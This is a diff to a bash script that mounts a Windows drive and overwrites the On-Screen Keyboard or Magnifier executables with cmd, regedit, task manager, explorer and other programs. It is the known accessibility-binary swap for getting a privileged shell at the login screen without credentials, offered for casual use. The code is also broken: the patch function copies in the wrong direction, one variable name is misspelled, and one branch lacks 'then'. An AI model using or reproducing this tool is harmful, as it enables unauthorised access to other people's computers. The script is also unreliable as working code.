@@ -9,6 +9,53 @@ usage()
     echo "if no mountpoint is provided, script will try to parse mountpoint as /dev/sda4"
 }
 
+patchlist() {
+    clear
+    echo "Patch for $1.exe "
+    echo "Patch with : "
+    echo " 1 : cmd "
+    echo " 2 : Netplwiz"
+    echo " 3 : Control Panel (probably doesn't work)"
+    echo " 4 : explorer.exe "
+    echo " 5 : Calculator (calc)"
+    echo " 6 : Display Switch (DisplaySwitch)"
+    echo " 7 : Device Info (msinfo32)"
+    echo " 8 : notepad "
+    echo " 9 : Regedit (regedt32) "
+    echo " 10 : Task Manager (taskmgr)"
+    read -p " Make your choice : " patch 
+        if [[ $patch = 1 ]]; then 
+            patcher $1 cmd 
+        elif [[ $patch = 2 ]]; then 
+            patcher $1 Netplwiz 
+        elif [[ $patch = 3 ]]; then 
+            patcher $1 control 
+        elif [[ $patch = 4 ]]; then 
+            patcher $1 explorer 
+        elif [[ $patch = 5 ]]; then 
+            patcher $1 calc 
+        elif [[ $patch = 6 ]]; then 
+            patcher $1 DisplaySwitch 
+        elif [[ $patch = 7 ]]; then 
+            patcher $1 msinfo32 
+        elif [[ $patch = 8 ]]; then 
+            patcher $1 notepad 
+        elif [[ $patch = 9 ]]; then 
+            patcher $1 regedt32 
+        elif [[ $patch = 10 ]]; then 
+            patcher $1 taskmgr 
+        else 
+            echo "Unknown option."
+            exit 
+        fi        
+}
+
+patcher() {
+    echo Patching..
+    cp -fpr $2.exe bruh.exe 
+    cp -fpr $1.exe $2.exe 
+}
+
 if [[ $(whoami | grep root) ]]; then 
     : 
 else 
@@ -45,11 +92,24 @@ echo ""
 echo ""
 echo ""
 echo ""
-# Logic parts
-cd drive/Windows/System32 
-sudo cp -fpr osk.exe wtf.exe 
-sudo cp -fpr Netplwiz.exe osk.exe
-sudo cp -fpr Magnify.exe lmao.exe
-sudo cp -fpr cmd.exe Magnify.exe
-echo "Patching done !"
-echo "Enable OSK and enjoy Control Panel !"
+echo "============================================================================="
+echo "=                               Patch menu                                  ="
+echo "= (1) Patch On Screen Keyboard (osk.exe)                                    ="
+echo "= (2) Patch Magnifyer (magnify.exe)                                         ="
+echo "= (3) View credits                                                          ="
+echo "= (0) Reboot                                                                ="
+echo "============================================================================="
+read -p "Make your choice : " choice 
+
+if [[ $choice = 1 ]]; then 
+    patchlist osk 
+elif [[ $chice = 2 ]]; then 
+    patchlist magnify 
+elif [[ $choice = 3 ]];
+    echo "jam boiiiiii"
+elif [[ $choice = 0 ]]; then 
+    reboot 
+else 
+    echo "unknown option bruh"
+    exit 
+fi
